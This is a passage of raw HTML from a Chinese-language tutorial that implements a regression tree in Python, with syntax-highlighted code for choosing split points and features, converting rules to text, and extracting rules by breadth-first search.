</span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dae580177047-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dae580177047-6\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">unique</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">remove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">unique</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dae580177047-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">mse</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dae580177047-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_get_split_mse</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dae580177047-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">split </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">unique</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-o\">=</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dae580177047-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mse</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p></p>\n<h2>2.5 选择最佳特征</h2>\n<p>遍历所有特征，计算最佳分割点对应的MSE，找出MSE最小的特征、对应的分割点，左右子节点对应的均值和行号。如果所有的特征都没有不重复元素则返回None</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2db3171468053\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _choose_feature(self, X, y, idx):\r\n    m = len(X[0])\r\n    split_rets = [x for x in map(lambda x: self._choose_split_point(\r\n        X, y, idx, x), range(m)) if x is not None]\r\n\r\n    if split_rets == []:\r\n        return None\r\n    _, feature, split, split_avg = min(\r\n        split_rets, key=lambda x: x[0])\r\n\r\n    idx_split = [[], []]\r\n    while idx:\r\n        i = idx.pop()\r\n        xi = X[i][feature]\r\n        if xi &lt; split:\r\n            idx_split[0].append(i)\r\n        else:\r\n            idx_split[1].append(i)\r\n    return feature, split, split_avg, idx_split</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db3171468053-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db3171468053-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_choose_feature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">split_rets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">map</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_choose_split_point</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">m</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_rets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">None</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">min</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">split_rets</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-o\">=</span><span class=\"crayon-i\">lambda</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pop</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">xi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">xi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-16\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db3171468053-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">idx_split</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db3171468053-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split_avg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">idx_split</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0280 seconds] -->\r\n<p></p>\n<h2>2.6 规则转文字</h2>\n<p>将规则用文字表达出来，方便我们查看规则。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2db8816491284\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _expr2literal(self, expr):\r\n    feature, op, split = expr\r\n    op = \"&gt;=\" if op == 1 else \"&lt;\"\r\n    return \"Feature%d %s %.4f\" % (feature, op, split)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db8816491284-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db8816491284-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2db8816491284-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2db8816491284-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2db8816491284-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_expr2literal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">expr</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db8816491284-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">expr</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2db8816491284-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">op</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&gt;=\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2db8816491284-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Feature%d %s %.4f\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">op</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">split</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0158 seconds] -->\r\n<p></p>\n<h2>2.7 获取规则</h2>\n<p>将回归树的所有规则都用文字表达出来，方便我们了解树的全貌。这里用到了队列+广度优先搜索。有兴趣也可以试试递归或者深度优先搜索。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dbc329687509\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _get_rules(self):\r\n    que = [[self.root, []]]\r\n    self.rules = []\r\n\r\n    while que:\r\n        nd, exprs = que.pop(0)\r\n        if not(nd.left or nd.right):\r\n            literals = list(map(self._expr2literal, exprs))\r\n            self.rules.append([literals, nd.score])\r\n\r\n        if nd.left:\r\n            rule_left = copy(exprs)\r\n            rule_left.append([nd.feature, -1, nd.split])\r\n            que.append([nd.left, rule_left])\r\n\r\n        if nd.right:\r\n            rule_right = copy(exprs)\r\n            rule_right.append([nd.feature, 1, nd.split])\r\n            que.append([nd.right, rule_right])</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dbc329687509-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dbc329687509-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_get_rules</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">que</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rules</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">que</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dbc329687509-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">exprs</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">que</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pop</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dbc329687509-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">not</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">left </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span 